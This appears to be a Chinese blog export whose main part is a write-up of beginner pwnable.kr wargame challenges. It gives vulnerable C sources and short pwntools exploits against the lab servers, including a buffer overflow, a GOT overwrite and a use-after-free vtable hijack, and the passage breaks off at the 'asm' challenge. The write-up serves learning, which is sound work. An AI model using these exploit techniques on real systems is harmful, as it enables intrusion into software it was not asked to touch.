比如在本例中，对于main函数来讲，调用了两个外部函数add和printf，根据上面信息，add函数相关的代码已经确定在0x400526处。因此，该地址就是call指令的调用add的操作数。而上述代码显示的400400处似乎并非是printf函数真正的实现。没错，这是因为printf函数是属于libc的库函数，但是，我们知道对于动态链接来讲，在生成可执行文件时，并未将它所依赖的动态库的代码复制过来，而只是复制了相关的重定位信息和符号表，所以，此时依然不能确定printf函数的地址。而400400处的内存值只是一个跳板，等程序运行时，动态链接器会将相关动态链接库的代码链接进来，修改这个跳板处对应的值，就可以让跳转指令正确的跳转到printf函数真正的内存地址处执行了。稍后我们将会对该过程做详细的分析。（涉及到PLT和GOT表的知识） 上篇文章我们提到，为了保证代码复用和节省计算机资源，在链接时，动态链接库的代码段和数据段等是不会被复制到最终生成的可执行文件中的，这些部分会在程序加载的时候复制到内存，并做动态链接，使原来可执行文件能够对其中定义的符号正常引用。也就是说在这个时候，可执行文件代码段中对动态链接库包含的符号引用的地址才真正确定下来。但是我们查看各个segment的属性可以知道，.text segment是只读的，也就是说在编译成可以执行文件之后，就不能被修改了，那么如何确保它能够正确的引用在加载时才能确定下来的动态链接库里的符号呢？这就需要我们这篇文章里的GOT和PLT作为跳板来实现了。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。 PLT全称Procedure Linkage Table，即过程链接表。它在可执行文件中也是一个单独的section，位于.textsection的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr第一部分exp与思路]]></title>
    <url>%2F2018%2F12%2F26%2Fpwnable-kr%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86exp%E4%B8%8E%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[写这些没用的东西也没啥目的，除了回忆一下知识之外也就是练一下exp的书写，因为很多题没必要用exp所以那时候做就没练过。。。。。pwnable.kr第一部分确实很适合初学者做，大多为知识题，主要是强迫你去学知识，而且后面几题建立出一个基本框架，此外搭配jarvis.oj和ctf-wiki有体系的学习更好，完成这些再去pwnable.tw。。。 fd思路：1.有源码肯定先分析源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 2.题意简单明了：先找flag，发现当buf中装的是LETMEWIN时获得flag，回头找buf从何而来，发生了啥， read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=’0x1234’ 即可。 exp： 12345from pwn import * s=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)p=s.process(argv=['./fd','4660'],executable='./fd')p.sendline('LETMEWIN')p.interactive() collision思路：1. 有源码看源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可 计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。） exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='col',password='guest',port=2222)str=p32(0x01010101)*4 + p32(0x1dd905e8)p=s.process(argv=['./col',str],executable='./col')p.interactive() bof思路：1. 下载看源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这题是最基础的缓冲区溢出，只要对其有过一点研究的人都应该没什么问题，ctfwili上有全面详细的剖析，推荐自学参考 ctf-wiki 看完以后再做这个绝对没有问题 很明显对含有gets()的func()进行溢出，用overflowme覆盖key将key变成0xcafebabe exp: 12345from pwn import * s=remote('pwnable.kr',9000)payload='A'*0x34 + p32(0xcafebabe)s.sendline(payload)s.interactive() flag思路：1. 没给源码，只有elf文件，直接放进ida中，因为题目提示了This is reversing task. all you need is binary所以F5大法基本不管用了，再看其函数少的可怜（基本是加壳了），再看hex-view 机器码一行一行看时发现一句话 this file is packed with the UPX…….很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。 先下载upx 然后在flag所在目录解壳flag,之后再把它放进ida中，看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可。 passcode思路： 1. 老套路有源码看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0; &#125; 这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70H，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：1.passcode1与2与name的偏移大于100 。 2.passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。 所以这个时候问题就变得比较操蛋，需要查资料和新的东西了，通过调试理解plt和got表 诞生一种新方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。 exp: 123456from pwn import *s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')p=s.process('./passcode')payload='a'* 0x60 + '\x04\xa0\x04\x08' + '134514147'p.sendline(payload)p.interactive() exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。 random思路：1. 有源码 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后用公式a或b=c，则a/b=c或b/a。用计算器得出答案。 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='random',port=2222,password='guest')p=s.process('./random')p.sendline('3039230856')p.interactive() input思路：1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 这题需要一些知识储备，包括socket通信，管道通信，环境变量的理解和简单运用，需要耐心一个一个知识点学习。 code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netdb.h&gt; void main()&#123; char *args[101]; int i; for(i=0;i&lt;100;i++)&#123; args[i]="A"; &#125; args['A']="\x00"; args['B']="\x20\x0a\x0d"; args['C']="5555"; args[100]=NULL; char* env[2]=&#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",NULL&#125;; int fd0[2]; int fd2[2]; pipe(fd0); pipe(fd2); FILE* fp = fopen("\x0a", "ab+"); fwrite("\x00\x00\x00\x00", 4, 1, fp); #define CHILD_READ0 fd0[0] #define PARENT_WRITE0 fd0[1] #define CHILD_READ2 fd2[0] #define PARENT_WRITE2 fd2[1] pid_t child; if((child=fork())&lt;0)&#123; printf("Error\n"); &#125;else if(child==0)&#123; close(PARENT_WRITE0); close(PARENT_WRITE2); dup2(CHILD_READ0,0); dup2(CHILD_READ2,2); close(CHILD_READ0); close(CHILD_READ2); execve("/home/input/input",args,env); &#125;else&#123; close(CHILD_READ0); close(CHILD_READ2); write(PARENT_WRITE0,"\x00\x0a\x00\xff",4); write(PARENT_WRITE2,"\x00\x0a\x02\xff",4); int sockfd, portno, n; struct sockaddr_in serv_addr; struct hostent *server; portno = atoi(args['C']); sockfd = socket(AF_INET, SOCK_STREAM, 0); server = gethostbyname("127.0.0.1"); bzero((char *) &amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; bcopy((char *)server-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, server-&gt;h_length); serv_addr.sin_port = htons(portno); sleep(5); connect(sockfd,(struct sockaddr *) &amp;serv_addr,sizeof(serv_addr)); write(sockfd,"\xde\xad\xbe\xef",4); close(sockfd); &#125;&#125; leg思路: 1. 有源码，也给了汇编码，知识题（学习arm汇编知识）： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm("mov r3, pc\n");&#125;int key2()&#123; asm( "push &#123;r6&#125;\n" "add r6, pc, $1\n" "bx r6\n" ".code 16\n" "mov r3, pc\n" "add r3, $0x4\n" "push &#123;r3&#125;\n" "pop &#123;pc&#125;\n" ".code 32\n" "pop &#123;r6&#125;\n" );&#125;int key3()&#123; asm("mov r3, lr\n");&#125;int main()&#123; int key=0; printf("Daddy has very strong arm! : "); scanf("%d", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf("Congratz!\n"); int fd = open("flag", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf("I have strong leg :P\n"); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push &#123;r4, r11, lr&#125; 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop &#123;r4, r11, pc&#125; 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 易得题意为计算key1,key2,key3的值，然后输入他们的和即可。学习知识参考以下两个链接：arm速成 跳转指令基本用法 mistake思路：1. 有源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 额，这题比较坑，要不是有hint也不知道能不能做出来。。。。。有hint就很简单了。。。。不说了吧 shellshock思路：1. 有源码： 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 根据提示和源码较为简单，猜是一道知识题 shellshock知识参考 需要注意的一点是执行cat flag时要改成 /bin/cat flag 因为sh的环境变量中未必有/bin，所以cat命令不一定能找到，最好用绝对路径。 coin1(借鉴别人的，不想写了。。)exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152# coding: utf-8import socketimport randomimport timeimport reimport string def getweight(start, end): str_ask = [str(n) for n in range(start, end)] str_ask = " ".join(str_ask) client.send(bytes(str_ask+"\n")) str_weight = client.recv(10) str(str_weight).split("\n") weight = int(str_weight) return weight HOST = ('0.0.0.0')PORT = 9007client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((HOST, PORT))data = client.recv(1024)time.sleep(4)for i in range(100): recv_data = str(client.recv(2048)) position_of_number = (recv_data.find('N=')) position_of_chance = (recv_data.find('C=')) # print(position_of_number) # print(position_of_chance) number = 0 chance = 0 for k in range(10): if str(recv_data[position_of_number + 2 + k]) &lt;= '9' and str(recv_data[position_of_number + 2 + k]) &gt;= '0': number = int(recv_data[position_of_number + 2 + k]) + number * 10 k += 1 else: break for k in range(100): if str(recv_data[position_of_chance + 2 + k]) &lt;= '9' and str(recv_data[position_of_chance + 2 + k]) &gt;= '0': chance = int(recv_data[position_of_chance + 2 + k]) + chance * 10 k += 1 else: break start = 0 end = number middle = int((start+end) / 2) for p in range(chance): weight=getweight(start, middle) if (middle - start) * 10 == weight: start = middle # print("start:",start) middle = int((middle + end) / 2) # print("middle:",middle) else: end = middle #print("start:", start) middle = int((start + middle) / 2) #print("middle:", middle) if (middle == start): print(end) client.send(bytes(str(start) + "\n"))s = client.recv(1024)print(s)#就是在这里昨天多加了一个enter，从而导致后面接收的数据有误(得加红加粗纪念一下）#client.send(bytes("\n", encoding="utf-8"))（垃圾代码毁我青春）s2=client.recv(1024)print(s2) blackjack思路：额，这题不想说啥，800多行代码其实就一小部分有用，就是考耐心与阅读速度，根据提示下赌注，成为百万富翁，然后就有flag了。 lotto思路：这题和上题一样也是脑洞一点的题，需要一点知识储备，就是ascii码表33号以后才为可见字符，范围大大缩小，等于在33~45的字符里随便选一个有 6/(45-33) 的概率获得flag。试几次就有了。。 cmd1思路：使参数通过滤器，利用字符串补齐功能即可。 cmd2思路：分析源代码可知是加强的过滤，需要你去了解环境变量PATH的作用和意义，extern 从外界导入变量，并且用一个函数将环境变量清空，代表所有的命令都必须是绝对路径。不能用‘/’是最操蛋的事，所以必须在根目录里用$(pwd)来显示‘ /‘，$(命令)的意义是将命令在sh里输入时的输出结果原封不动的换在$()的位置。 uaf思路： 1. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt; #include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0; &#125; 从这题开始就有点难度了，开始向读者介绍一些基本的pwn的方法，并且需要学很多新的知识，有知识才能解题，经过一番查阅后得知uaf为use after free/delete，即先malloc()一段空间后，free/delete后指向其的指针却没有NULL，从而继续申请一块大小相似的malloc()后（数据精心设计），这个指针将指向他，可以通过操纵这个指针来操纵这块被设计的数据空间，进而pwn。 大致思路分三步：一是先找到原来MAN申请的内存大小，作为第二个参数，二是找到虚函数表的地址，在ida里就可以解决，三是创建一个文件将修改的数据放进去(我创建文件创建不了，不知道为啥，只能从标准输入输入了)。 exp：（看别人的exp学到一个新技能，/dev/stdin） 1234567891011121314from pwn import * s=ssh(host='pwnable.kr',user='uaf',port=2222,password='guest')p=s.process(executable='./uaf',argv=['./uaf','24','/dev/stdin'])p.recv(1024)p.sendline('3')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('2')p.send('\x68\x15\x40\x00\x00\x00\x00\x00')p.recv(1024)p.sendline('1')p.interactive() memcpy思路： 1. 有源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 很明显要先学习知识：需要学习setvbuf()，mmap()函数，和c语言内嵌汇编的形式，以及movdqa,movntps命令是干啥的，也就是必须要理解以下这段代码是什么意思，在此分享一篇相当详细的文章 链接 1234567891011while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); 其实这题实际上想考的是堆分配时字节对齐问题。只要保证每次输入的数在他要求的范围内并且顺利运行完程序即可，问题在于movntps和movdqa要求操作的内存地址必须为16字节对齐的，所以dest必须为0x——0，可以在代码中加上一句 printf (“dest: %d\n”, dest) 再运行就观察起来方便很多，每次dest比上次增加的数就是上一次的size+8，自己找规律即可。 asm思路： 1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include 